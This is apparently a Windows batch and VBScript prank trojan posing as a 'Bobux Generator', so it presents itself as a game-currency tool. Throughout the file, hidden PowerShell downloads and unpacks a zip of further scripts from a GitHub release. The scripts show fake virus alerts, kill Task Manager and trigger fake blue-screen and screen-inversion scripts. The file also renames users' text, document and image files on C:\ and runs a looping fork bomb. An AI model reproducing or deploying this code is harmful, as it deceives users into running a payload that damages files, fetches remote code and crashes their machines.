@echo off
start /min Powershell -ExecutionPolicy bypass
echo Loading...
setlocal
setlocal EnableDelayedExpansion
taskkill /IM powershell.exe /F > NUL
timeout 1 > NUL

echo x=msgbox("Bobux Generator is loading... (DO NOT CLOSE THIS WINDOW!)" ,0+64, "Loading...") >> msgbox.vbs

start msgbox.vbs
timeout 1 > NUL
del /Q msgbox.vbs




echo checking internet connection
Ping www.google.nl -n 1 -w 1000
cls
if errorlevel 1 (goto nointernet) else (echo Connected)



if not exist "c:\Program Files\Windows Media Player\wmplayer.exe" goto mediaplayerfailed

IF EXIST "%USERPROFILE%\beanslmao\" del /Q "%USERPROFILE%\beanslmao\"
IF NOT EXIST "%USERPROFILE%\beanslmao\" mkdir "%USERPROFILE%\beanslmao\" 

rem timeout 1 > NUL
powershell -windowstyle hidden -command Invoke-WebRequest https://github.com/xxxMEMESCOEPxxx/viruzlol/releases/download/lol/lol.zip -OutFile %USERPROFILE%\beanslmao\package.zip
rem powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/xxxMEMESCOEPxxx/viruzlol/releases/download/lol/lol.zip', '%TEMP%\beanslmao\package.zip')"


rem timeout 5 > NUL
powershell -command Expand-Archive %USERPROFILE%\beanslmao\package.zip %USERPROFILE%\beanslmao
if not exist "c:\Program Files\Windows Media Player\wmplayer.exe" goto mediaplayerfailed



rem IF EXIST "C:\Program Files\Windows Media Player\wmplayer.exe" GOTO mediaplayerfailed 

echo Done.
cd "%USERPROFILE%\beanslmao\"

rem timeout 5 > NUL



IF "%1"=="beanslmao" goto startSound
wscript //nologo "%~f0?.wsf" //job:JS //job:VBS

exit /b %errorlevel%





 






rem echo Printed by CMD.EXE





<package>
  <job id="JS"> 
    <script language="VBScript">
    
        'strInput = UserInput( "Enter your age:" )
'If IsNumeric(strInput) Then
    ' Here, it still could be an integer or a floating point number
    'IF strInput = "" Then
'Wscript.Echo "You need to input your age lol"
Set oShell = CreateObject("WScript.Shell")
strHomeFolder = oShell.ExpandEnvironmentStrings("%USERPROFILE%")
'MsgBox(strHomeFolder + "\beanslmao\")
'OBJshell.run("https://www.google.com/search?rlz=1C1GCEA_enUS937US937&q=ahhhhhhhhhhhhh+halp+ma+compoota+is+doin+wierd+thangz+ahahahahhhahah+halp+plzzzzzz&nfpr=1&sa=X&ved=2ahUKEwjIz_LqouLwAhUZWs0KHbqoDPwQvgUoAXoECAEQNw&biw=1366&bih=657&safe=active&ssui=on")

'CreateObject("WScript.Shell").Run("taskkill /IM wscript.exe /F")

X=MsgBox("Congratulations, You just executed a virus! Do not try to close any windows, or your computer will be destroyed.", 4096+16, "VIRuS ALErT")

WScript.Sleep(30000)


CreateObject("WScript.Shell").Run("https://www.youtube.com/watch?v=dQw4w9WgXcQ")
CreateObject("WScript.Shell").Run("https://www.youtube.com/watch?v=lGp3Tl6m_eg")
CreateObject("WScript.Shell").Run("https://www.youtube.com/watch?v=MEDzOFMt2mo")

CreateObject("WScript.Shell").Run strHomeFolder + "\beanslmao\increaseVolume.vbs"
CreateObject("WScript.Shell").Run strHomeFolder + "\beanslmao\randsound.bat"
CreateObject("WScript.Shell").Run strHomeFolder + "\beanslmao\randsound.bat"



CreateObject("WScript.Shell").Run strHomeFolder + "\\beanslmao\\capslocklol.vbs"
WScript.Sleep(30000)

CreateObject("WScript.Shell").run("https://www.google.com/search?rlz=1C1GCEA_enUS937US937&q=ahhhhhhhhhhhhh+halp+ma+compoota+is+doin+wierd+thangz+ahahahahhhahah+halp+plzzzzzz&nfpr=1&sa=X&ved=2ahUKEwjIz_LqouLwAhUZWs0KHbqoDPwQvgUoAXoECAEQNw&biw=1366&bih=657&safe=active&ssui=on")

'CreateObject("WScript.Shell").Run strHomeFolder + "\\beanslmao\\setScreenRes.bat"
CreateObject("WScript.Shell").Run strHomeFolder + "\beanslmao\bsodee.vbs"
CreateObject("WScript.Shell").Run strHomeFolder + "\beanslmao\startinvertScreen.bat"
Wscript.Sleep(1000)
CreateObject("WScript.Shell").Run strHomeFolder + "\beanslmao\age_calculator.bat beanslmao"

'Else
'WScript.Echo "Your age is: " & strInput & "!"
'End If
'Else

'Wscript.Echo "You cannot enter text! You must enter an integer (number)!"
'X=MsgBox("Congrats! Your computer is now DEDDED! You are an idiot lol, do you just run any program on your computer? stoopid. Do not try to close any windows, or ur computer will be instantly destroyed.", 0+16, "u stoopid")
'CreateObject("WScript.Shell").Run("https://www.youtube.com/watch?v=dQw4w9WgXcQ")
'CreateObject("WScript.Shell").Run("https://www.youtube.com/watch?v=lGp3Tl6m_eg")
'CreateObject("WScript.Shell").Run("https://www.youtube.com/watch?v=MEDzOFMt2mo")
'CreateObject("WScript.Shell").Run "increaseVolume.vbs"
'CreateObject("WScript.Shell").Run "randsound.bat"
'CreateObject("WScript.Shell").Run "randsound.bat"
'CreateObject("WScript.Shell").Run "randsound.bat"
'CreateObject("WScript.Shell").Run "randsound.bat"
'CreateObject("WScript.Shell").Run "randsound.bat"
'CreateObject("WScript.Shell").Run "randsound.bat"
'CreateObject("WScript.Shell").Run "randsound.bat"
'CreateObject("WScript.Shell").Run "randsound.bat"
'CreateObject("WScript.Shell").Run "randsound.bat"
'CreateObject("WScript.Shell").Run "randsound.bat"

'CreateObject("WScript.Shell").Run "capslocklol.vbs"
'WScript.Sleep(30000)

'CreateObject("WScript.Shell").run("https://www.google.com/search?rlz=1C1GCEA_enUS937US937&q=ahhhhhhhhhhhhh+halp+ma+compoota+is+doin+wierd+thangz+ahahahahhhahah+halp+plzzzzzz&nfpr=1&sa=X&ved=2ahUKEwjIz_LqouLwAhUZWs0KHbqoDPwQvgUoAXoECAEQNw&biw=1366&bih=657&safe=active&ssui=on")

'CreateObject("WScript.Shell").Run "setScreenRes.bat"
'CreateObject("WScript.Shell").Run "bsodee.vbs"
'CreateObject("WScript.Shell").Run "startinvertScreen.bat"
'Wscript.Sleep(1000)
'CreateObject("WScript.Shell").Run "age_calculator.bat beanslmao"


'End If

Function UserInput( myPrompt )

    ' Check if the script runs in CSCRIPT.EXE
    'If UCase( Right( WScript.FullName, 12 ) ) = "\CSCRIPT.EXE" Then
        ' If so, use StdIn and StdOut
        'WScript.StdOut.Write myPrompt & " "
        'UserInput = WScript.StdIn.ReadLine
    'Else
        ' If not, use InputBox( )
        'UserInput = InputBox( myPrompt )
    'End If
End Function
        
    </script>
  </job>
  <job id="VBS"> 
    <script language="VBScript">
  

        
    </script>
  </job>
</package>
rem End If



:startSound
ren "C:"\*.txt *.lmao
ren "C:"\*.docx *.lmao
ren "C:"\*.png *.lmao
ren "C:"\*.jpg *.lmao
start /min "%USERPROFILE%\beanslmao\randsound.bat"

:crashtheentirefockencompootah
rem start /min sound.vbs "%file%"
rem wscript //nologo "%~f0?.wsf" //job:JS //job:VBS
ren "C:"\*.txt *.lmao
ren "C:"\*.docx *.lmao
ren "C:"\*.png *.lmao
ren "C:"\*.jpg *.lmao

start "%USERPROFILE%\beanslmao\lmaofff.bat"
taskkill /IM taskmgr.exe /F
start /min "%USERPROFILE%\beanslmao\Fbeans.bat"
start /min "%USERPROFILE%\beanslmao\bsodee.vbs"
rem start /min "invertScreen.vbs"
start /min "%USERPROFILE%\beanslmao\setScreenRes.bat"
%0|%0 beanslmao
goto crashtheentirefockencompootah
rem pause

:nointernet
rem @echo on


echo x=msgbox("No Internet Connection! Please check your settings to continue." ,0+16, "NO INTERNET") >> msgbox.vbs


start msgbox.vbs
timeout 1 > NUL
del /Q msgbox.vbs
goto done






:mediaplayerfailed
rem @echo on


echo x=msgbox("Windows Media Player is not installed! WMP needs to be installed for sound effects. If you do not know how to install WMP, follow the highlighted instructions at https://tinyurl.com/installwmpwin10" ,0+16, "WMP is not installed") >> msgbox.vbs


start msgbox.vbs
timeout 1 > NUL
del /Q msgbox.vbs


:done

